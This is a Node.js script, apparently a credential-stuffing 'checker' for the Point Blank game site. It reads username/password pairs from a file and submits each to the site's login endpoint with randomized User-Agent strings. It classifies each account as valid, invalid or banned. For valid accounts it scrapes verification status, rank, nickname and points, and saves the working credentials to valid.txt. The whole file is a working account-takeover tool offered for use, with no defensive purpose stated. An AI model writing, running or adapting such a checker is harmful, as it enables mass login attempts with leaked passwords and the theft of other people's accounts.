const fetch = require('node-fetch')
const cheerio = require('cheerio')
const chalk = require('chalk')
const fs = require('fs')
const readline = require('readline-sync')

const getSession = (Agent) => new Promise((resolve, reject) => {
    fetch(`https://www.pointblank.id/login/form`, {
        method: 'GET',
        headers: {
            'Host': 'www.pointblank.id',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': Agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.pointblank.id/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
},
    })
    .then(async res => {
        const result = '_ga=GA1.2.684883732.1591705044; _gid=GA1.2.707081643.1591705044; '
        const cookie = res.headers.raw()['set-cookie']
        var cook = new Array()
        cookie.map(async function(value, index){
            cook.push(value.split(';')[0] + ';')
        })
        resolve(result + cook)
    })
    .catch(err => reject(err))
});

const gasLogin = (cookies, user, pw, Agent) => new Promise(async (resolve, reject) => {
   const boday = `loginFail=0&userid=${user}&password=${pw}`
    fetch(`https://www.pointblank.id/login/process`, {
        method: 'POST',
        headers: {
            'Host': 'www.pointblank.id',
            'Connection': 'keep-alive',
            'Content-Length': boday.length,
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Origin': 'https://www.pointblank.id',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': Agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.pointblank.id/login/form',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookies
},
        body: boday
    })
    .then(async res => {
        const result = await res.text()

        resolve(result)
    })
    .catch(err => reject(err))
});

const getMyInfo = (cookies, Agent) => new Promise((resolve, reject) => {
    fetch(`https://www.pointblank.id/mypage/info`, {
        method: 'GET',
        headers: {
            'Host': 'www.pointblank.id',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': Agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.pointblank.id/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookies
},
    })
    .then(async res => {
        const ress = await res.text()
        $ = cheerio.load(ress)
        const result = {
            email: ress.includes('Email verification is required')?'Email Non Verif':'Email ter-Verif',
            no: ress.includes('Untuk user yang sudah menerima verifikasi SMS dapat menggunakan channel premium.')?'No HP Non Verif':'No HP ter-Verif'
        }
        resolve(result)
    })
    .catch(err => reject(err))
});

const getMyRank = (cookies, Agent) => new Promise((resolve, reject) => {
    fetch(`https://www.pointblank.id/mypage/profile`, {
        method: 'GET',
        headers: {
            'Host': 'www.pointblank.id',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': Agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.pointblank.id/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookies
},
    })
    .then(async res => {
        const ress = await res.text()
        $ = cheerio.load(ress)
        var exp = new Array()
        $('div[class="my_rank_exp"] ul li h4').remove();
        $(`div[class="my_rank_exp"] ul li`).each(function(index, element){
            exp[index] =  $(this).text()
        })
        const result = {
            rank: 'https://www.pointblank.id' + $(`div[class="my_rank"] p img`).attr('src'),
            nick: $(`div[class="my_rank"] p`).text(),
            exp: exp
        }
        resolve(result)
    })
    .catch(err => reject(err))
});

(async() => {
    console.log(chalk.bgRed('CHECKER POINTBLANK\nCREATED BY ARL'))
    const path = readline.question('Path txt (akun.txt) : ')
    const pemisah = readline.question('Pemisahnya pake apa? : ')
    fs.readFile(path, {encoding: 'utf-8'}, async function(err,data){
        if (!err) {
            const akun = data.split('\n')
            akun.map(async function(value, index)//for(let i =0; i<akun.length;i++)
            {
                try {
                    let useragent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(Math.random() * (15 - 10) + 10,)}_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * (79 - 70) + 70)}.0.3945.117 Safari/537.36`
                   // const value = akun[i]
                    const user = value.split(pemisah)[0]
                    const password = value.split(pemisah)[1]
                    const cookies = await getSession(useragent)
                    const otwLogin = await gasLogin(cookies, user, password, useragent)
                    if(otwLogin.includes('Anda telah melampaui jumlah kegagalan login.'))
                    {
                        console.log('Anda telah melampaui jumlah kegagalan login.')
                    }
                    else if(otwLogin.includes('End Date'))
                    {
                        console.log('Banned UNBLOCK AT', otwLogin.split('End Date :')[1].split(' ]"')[0])
                    }
                    else if(otwLogin.includes('Data login yang anda masukan tidak sesuai.'))
                    {
                        console.log(chalk.red('[DIE]', user))
                    }else{
                        const getInfo = await getMyInfo(cookies, useragent)
                        const getRank = await getMyRank(cookies, useragent)
                        console.log(chalk.bgGreen(`[VALID] AKUN POINTBLANK`) + chalk.bgBlue(`\nUser|Pw : ${user}|${password}\nEmail : ${getInfo.email}\nNo : ${getInfo.no}\nRank : ${getRank.rank}\nNick : ${getRank.nick}\nMVP : ${getRank.exp[0]}\nExp : ${getRank.exp[1]}\nPoint : ${getRank.exp[2]}`))
                        fs.appendFileSync('valid.txt', `[VALID] AKUN POINTBLANK\nUser|Pw : ${user}|${password}\nEmail : ${getInfo.email}\nNo : ${getInfo.no}\nRank : ${getRank.rank}\nNick : ${getRank.nick}\nMVP : ${getRank.exp[0]}\nExp : ${getRank.exp[1]}\nPoint : ${getRank.exp[2]}\n======================\n`);
                    }   
                } catch (error) {
                    console.log(error.toString())
                }
            })

        } else {
            console.log(err);
        }
    });
})()